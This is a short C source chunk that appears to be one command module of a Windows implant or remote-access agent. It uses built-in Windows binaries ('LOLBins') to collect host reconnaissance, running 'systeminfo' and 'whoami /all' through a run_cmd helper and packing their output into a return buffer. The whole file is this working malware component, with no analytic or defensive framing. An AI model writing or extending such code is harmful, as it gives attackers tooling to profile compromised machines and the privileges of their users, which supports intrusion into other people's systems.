// chunk: commands/cmd_sysinfo_lolbin
// depends: core/run_cmd
// provides: cmd_sysinfo_lolbin
// note: LOLBin — sysinfo via systeminfo + whoami (spawns child processes)

#ifndef CHUNK_CMD_SYSINFO_LOLBIN
#define CHUNK_CMD_SYSINFO_LOLBIN

static int cmd_sysinfo_lolbin(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    DWORD cap = *out_len;
    DWORD pos = 0;

    char buf[8192] = {0};
    DWORD buf_len = 0;

    run_cmd("cmd.exe /c systeminfo", buf, sizeof(buf), &buf_len);
    if (buf_len > 0 && pos + buf_len < cap) {
        memcpy(out + pos, buf, buf_len);
        pos += buf_len;
    }

    buf[0] = '\0'; buf_len = 0;
    run_cmd("cmd.exe /c whoami /all", buf, sizeof(buf), &buf_len);
    if (buf_len > 0 && pos + buf_len < cap) {
        memcpy(out + pos, buf, buf_len);
        pos += buf_len;
    }

    *out_len = pos;
    return 0;
}

#endif
